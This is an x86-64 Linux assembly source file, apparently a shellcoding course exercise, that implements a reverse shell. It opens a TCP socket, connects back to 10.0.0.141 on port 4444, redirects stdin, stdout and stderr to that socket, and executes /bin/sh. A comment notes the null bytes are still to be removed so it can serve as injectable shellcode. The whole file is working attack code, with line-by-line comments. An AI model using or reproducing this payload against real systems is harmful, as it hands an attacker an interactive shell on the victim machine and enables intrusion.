; David @InfinitelyManic
; Code inspired by  http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
; connect back shell or reverse bind shell
; name -a
; Linux ubuntuserver00A 4.4.0-71-generic #92-Ubuntu SMP Fri Mar 24 12:59:01 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

; lsb_release -a
; Distributor ID: Ubuntu
; Description:    Ubuntu 16.04.3 LTS
; Release:        16.04
; Codename:       xenial

; remove the nulls later
section .bss
section .data
section .text
        global _start

_start:
        nop

        ; man 2 syscall
        ;  x86_64        rdi   rsi   rdx   r10   r8    r9    -

        ; socket(int domain, int type, int protocol);

        ; domain argument specifies communication domain; this selects protocol family
        ;  AF_INET IPv4 Internet protocols

        ; type, which specifies the communication semantics
        ; SOCK_STREAM

        ; socket = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1

        ; syscall number 41
        mov rax, 41             ; syscall
        mov rdi, 2              ; domain
        mov rsi, 1              ; type
        mov rdx, 0              ; proto
        syscall
                                ; socket descriptor returned in rax
        ; copy socket descriptor to rdi for future use
        mov rdi, rax            ; save sockfd
        ; struct sockaddr...
        ; set up data structure on stack
        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)
        xor rax, rax                            ; init eight bytes to 0
        push rax                                ; 0x0000 0000 0000 0000

        ; ****************************************RESEARCH HOW TCP/IP PACKETS HANDLE THE PADDING FROM SOCKET***************
        ;mov dword [rsp-0], 0xdec0adde          ; pass 8 bytes into empty space in packet - work on retreiving this later
        ;mov dword [rsp-0], 0xffffffff          ; pass 8 bytes into empty space in packet - work on retreiving this later
        ; *****************************************************************************************************************

        mov dword [rsp-4], 0x8d00000a           ; IP addr remote machine connect back address 10.0.0.141
;       mov dword [rsp-4], 0xed00000a           ; IP addr remote machine connect back address 10.0.0.237

        mov word [rsp-6], 0x5c11                ; PORT  (4444 == 0x115c)  - placed on the stack in network order == big endian
        mov word [rsp-8], 0x02                  ; DOMAIN 0002                   domain
        sub rsp, 8                              ; 0x0000 0000 5c11 0002


        ; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        ;               rdi                      rsi                  rdx
        ; syscall number 42
        ; connect
        mov rax, 42                             ; syscall connect
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; 0x0000 0000 5c11 0002
        mov rdx, 16                             ; length of 16 byes or 32 bits for IPv4
        syscall


        ; store the client socket description
;       mov r9, rax

       ; duplicate sockets
        ; int dup2(int oldfd, int newfd);
        ; p2()
        ; The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
        ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
        ; dup2 (new, old)
        mov rax, 33
        mov rsi, 0              ; newfd =std in
        syscall

        mov rax, 33
        ; rdi
        mov rsi, 1              ; newfd = std out
        syscall

        mov rax, 33
        ; rdi
        mov rsi, 2              ; newfd = std error
        syscall

        ; execve *************************************
        ; First NULL push
        xor rax, rax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
        mov rax, 59
        syscall
                                                                  
